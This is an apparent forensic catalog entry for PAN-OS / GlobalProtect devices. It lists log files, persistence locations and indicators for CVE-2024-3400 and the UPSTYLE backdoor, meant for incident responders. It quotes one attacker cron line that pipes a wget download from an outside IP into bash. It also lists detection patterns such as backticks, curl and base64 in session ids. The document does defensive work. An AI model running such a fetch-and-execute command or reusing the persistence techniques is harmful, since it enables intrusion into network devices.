# Edge platform catalog entry
# EDGE-0001 - PAN-OS / GlobalProtect
# Schema: ../schema/platform.schema.json

id: EDGE-0001
name: PAN-OS / GlobalProtect
vendor: Palo Alto Networks
products: [PA-Series, VM-Series, GlobalProtect portal and gateway]
os_base: Linux (vendor kernel), restricted operational CLI
filesystem: Separate partitions for root, configuration, content and logs; root is not customer-readable
customer_shell: "no"
memory_acquisition: vendor-assisted
profile: panos
collection:
  - method: Operational CLI over SSH (show, tail mp-log)
    impact: none
    description: State, configuration, admin and GlobalProtect sessions, and management-plane logs.
    confidence: high
  - method: Tech support file (TSF)
    impact: vendor-bundle
    description: The broadest on-box collection available to a customer. Generate it before any upgrade.
    confidence: high
    references: [https://security.paloaltonetworks.com/CVE-2024-3400]
  - method: Vendor-assisted root and memory access
    impact: break-glass
    description: Cron, site-packages and web-root files the TSF may not carry, and memory. Only through a support case.
    confidence: medium
volatility:
  - Some logs from the prior installation become inaccessible on the device after an upgrade (vendor advisory for CVE-2024-3400); support may still help investigate the prior installation
  - mp-monitor netstat and top snapshots in the TSF are the closest thing to historical process state
anti_forensics:
  - technique: Deleted its own log lines and restored file timestamps
    seen_in: UPSTYLE (CVE-2024-3400)
    detail: Gaps in sslvpn_ngx_error.log are as meaningful as hits.
response: panos
hardening: panos
artifacts:
  - locator: tail lines N mp-log gpsvc.log
    class: web-logs
    volatility: rotating
    retention: Rotates by size on the management plane; older generations in the TSF
    forensic_value: high
    evidence_type: [initial-access, timeline]
    confidence: high
    collected_by: mp_gpsvc
    description: GlobalProtect service log. CVE-2024-3400 attempts leave "failed to unmarshal session(...)" entries whose session id is a path or command instead of a GUID.
    seen_in: [CVE-2024-3400]
    provides: >-
      GlobalProtect session-handling errors with the time, client address and the
      session id each request presented.
    normal: >-
      Occasional "failed to unmarshal session" errors from broken clients, where the
      session id is a GUID.
    suspicious: >-
      A path, ../, backticks, $( ), curl, wget or base64 where the GUID should be -
      an exploitation attempt; success needs other evidence.
    basis: vendor
  - locator: tail lines N mp-log sslvpn_ngx_error.log
    class: web-logs
    volatility: rotating
    forensic_value: high
    evidence_type: [execution, defense-evasion, timeline]
    confidence: high
    collected_by: mp_sslvpn_ngx_error
    description: Portal nginx error log. UPSTYLE read its commands from requests logged here and deleted its own lines afterwards; a gap is as meaningful as a hit.
    seen_in: [UPSTYLE]
    provides: >-
      Portal web-server errors with client address and request line.
    normal: >-
      A steady stream of ordinary client errors with no gaps.
    suspicious: >-
      Requests carrying encoded commands, or a span of missing lines - UPSTYLE
      deleted the lines it read its commands from.
    basis: researcher
  - locator: /etc/cron.d/* and /var/spool/cron/*
    class: persistence
    volatility: stable
    forensic_value: high
    evidence_type: [persistence, execution]
    confidence: high
    collected_by: manual
    description: Cron persistence (wget piped to bash) installed after CVE-2024-3400 exploitation. Not reachable through the CLI; request through the vendor.
    seen_in: [CVE-2024-3400]
    provides: >-
      Scheduled jobs on the management plane.
    normal: >-
      Only the entries shipped with the release; customers have no shell to add
      their own.
    suspicious: >-
      Any job that downloads content and pipes it to a shell.
    basis: researcher
  - locator: /usr/lib/python3.6/site-packages/system.pth
    class: persistence
    volatility: stable
    forensic_value: high
    evidence_type: [persistence, execution]
    confidence: high
    collected_by: manual
    description: UPSTYLE loader. Python executes .pth files at interpreter start, so any .pth in site-packages that is not from a package needs explaining.
    seen_in: [UPSTYLE]
    provides: >-
      Python start-up hooks, which run on every interpreter start.
    normal: >-
      .pth files that belong to installed packages.
    suspicious: >-
      A system.pth, or any .pth not owned by a package, especially one that decodes
      or executes code.
    basis: researcher
  - locator: /var/appweb/sslvpndocs/global-protect/portal/css/bootstrap.min.css
    class: filesystem
    volatility: stable
    forensic_value: high
    evidence_type: [execution, exfiltration]
    confidence: high
    collected_by: ingest
    description: >-
      UPSTYLE appended command output to this served CSS file and restored the
      original file and its timestamps about 15 seconds later, so a hash match
      does not clear the device. Compare against a clean copy of the same release.
    seen_in: [UPSTYLE]
    provides: >-
      A file the portal serves to anyone.
    normal: >-
      Byte-identical to the same file in a clean install of the same release.
    suspicious: >-
      Any difference from a clean copy. The absence of a difference proves
      nothing: Volexity says the original was restored after 15 seconds.
    basis: researcher
  - locator: /var/appweb/sslvpndocs/global-protect/*.css and /var/appweb/htdocs/unauth/*
    class: filesystem
    volatility: stable
    forensic_value: high
    evidence_type: [exfiltration, persistence]
    confidence: medium
    collected_by: ingest
    description: >-
      Unauthenticated web roots. For CVE-2024-3400, running-config.xml was copied
      to a .css file in the global-protect directory (Volexity, Unit 42).
      /var/appweb/htdocs/unauth/ is the write path in watchTowr's proof of concept
      for CVE-2024-9474 (researcher; not an in-the-wild report).
    seen_in: [CVE-2024-3400, CVE-2024-9474]
    provides: >-
      Everything reachable on the portal without logging in.
    normal: >-
      The release's own scripts, styles and images.
    suspicious: >-
      Copies of running-config.xml (a .css file that starts with <config),
      PHP or JSP files, or anything newer than the install.
    basis: researcher
  - locator: /var/log/syslog-system.log (and dated copies, inside the TSF)
    class: system-logs
    volatility: rotating
    forensic_value: high
    evidence_type: [persistence, execution, timeline]
    confidence: medium
    collected_by: ingest
    description: >-
      Volexity: "This log file is located at /var/log/syslog-system.log and
      contains various entries related to crond executions and other system
      activity." It is where the CVE-2024-3400 cron persistence showed.
    seen_in: [CVE-2024-3400]
    provides: >-
      crond execution records with the command each job ran.
    normal: >-
      crond running the release's own jobs.
    suspicious: >-
      crond running a download piped to a shell, as in Volexity's example
      "crond[18423]: (root) CMD (wget -qO- http://172.233.228.93/policy | bash)".
    basis: researcher
  - locator: mp-monitor.log (inside the TSF)
    class: process
    volatility: rotating
    forensic_value: medium
    evidence_type: [execution, timeline]
    confidence: medium
    collected_by: ingest
    description: Periodic netstat and top snapshots. The nearest thing PAN-OS has to historical process and socket state.
    provides: >-
      Periodic process and socket snapshots from before you arrived.
    normal: >-
      The release's daemons and the management connections you expect.
    suspicious: >-
      Shells or interpreters holding sockets, unknown processes, outbound
      connections from the management plane.
    basis: toolkit
  - locator: show jobs all
    class: config
    volatility: live
    forensic_value: medium
    evidence_type: [exfiltration, configuration, timeline]
    confidence: high
    collected_by: show_jobs
    description: Commits, content installs and exports with the admin who ran them. A config export job is the record of config theft through supported channels.
    provides: >-
      Commits, content installs and exports with the administrator and time.
    normal: >-
      Jobs that match change records.
    suspicious: >-
      Configuration exports or commits by unexpected administrators or at unexpected
      times.
    basis: toolkit
  - locator: show log system / config / auth
    class: system-logs
    volatility: rotating
    retention: Bounded by log quota on the management plane; forward to Panorama or syslog for retention
    forensic_value: medium
    evidence_type: [timeline, configuration]
    confidence: high
    collected_by: show_log_system
    description: >-
      System, configuration-audit and authentication event logs. The crond lines
      Volexity used for the cron persistence are in /var/log/syslog-system.log in
      the tech support file, a different log; no source shows them here.
    provides: >-
      System, configuration-audit and authentication events.
    normal: >-
      Logins by known administrators from management addresses; changes that match
      change control.
    suspicious: >-
      Logins from new sources and configuration changes nobody owns.
    basis: toolkit
  - locator: Panorama / syslog receiver copies of the above
    class: off-box
    volatility: off-box
    forensic_value: high
    evidence_type: [timeline, defense-evasion]
    confidence: high
    collected_by: ingest
    description: The copies the attacker is least likely to have touched. A gap in forwarding during the window is itself a finding.
    provides: >-
      The copies of the device's logs it cannot reach to edit.
    normal: >-
      Continuous forwarding that matches the device's own logs.
    suspicious: >-
      A forwarding gap during the window, or events off-box that are missing on the
      device.
    basis: toolkit
confidence: high
references:
  - title: Vendor advisory CVE-2024-3400
    url: https://security.paloaltonetworks.com/CVE-2024-3400
    accessed: "2026-10-22"
  - title: Volexity - detecting compromise of CVE-2024-3400
    url: https://www.volexity.com/blog/2024/05/15/detecting-compromise-of-cve-2024-3400-on-palo-alto-networks-globalprotect-devices/
    accessed: "2026-10-22"
notes: >-
  No primary vendor document describing customer root-shell policy was found;
  this entry assumes vendor-assisted access only.
last_modified: "2026-10-22"
